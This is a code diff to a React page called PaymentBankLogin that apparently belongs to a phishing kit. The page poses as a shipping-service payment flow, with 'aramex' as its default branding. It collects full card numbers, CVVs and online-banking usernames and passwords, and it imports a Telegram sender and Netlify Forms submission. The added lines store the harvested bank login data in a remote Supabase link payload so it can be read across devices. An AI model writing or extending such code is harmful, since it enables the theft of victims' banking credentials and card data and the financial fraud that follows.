@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -17,6 +17,7 @@ const PaymentBankLogin = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
+  const updateLink = useUpdateLink();
   
   // Bank login credentials state
   const [username, setUsername] = useState("");
@@ -25,18 +26,18 @@ const PaymentBankLogin = () => {
   const [customerId, setCustomerId] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  
-  // Get customer info and selected bank from sessionStorage
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
-  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
-  const cardInfo = {
-    cardName: sessionStorage.getItem('cardName') || '',
-    cardLast4: sessionStorage.getItem('cardLast4') || '',
-    cardNumber: sessionStorage.getItem('cardNumber') || '',
-    cardExpiry: sessionStorage.getItem('cardExpiry') || '',
-    cardCvv: sessionStorage.getItem('cardCvv') || '',
-    cardType: sessionStorage.getItem('cardType') || '',
+
+  // Get customer info and selected bank from link data (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || {};
+  const selectedCountry = linkData?.payload?.selectedCountry || '';
+  const selectedBankId = linkData?.payload?.selectedBank || '';
+  const cardInfo = linkData?.payload?.cardInfo || {
+    cardName: '',
+    cardLast4: '',
+    cardNumber: '',
+    cardExpiry: '',
+    cardCvv: '',
+    cardType: '',
   };
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
@@ -147,7 +148,7 @@ const PaymentBankLogin = () => {
     }
     
     setIsSubmitting(true);
-    
+
     // Store bank login info
     const bankLoginData = {
       username: loginType === 'username' ? username : '',
@@ -156,8 +157,26 @@ const PaymentBankLogin = () => {
       password: password,
       loginType: loginType,
     };
-    
+
+    // Save to sessionStorage (for current session) and link (for cross-device)
     sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
+
+    // Save to link for cross-device compatibility
+    if (linkData) {
+      try {
+        const updatedPayload = {
+          ...linkData.payload,
+          bankLoginData,
+        };
+
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+        console.error('Error saving bank login data:', error);
+      }
+    }
     
     // Submit to Netlify Forms
     try {
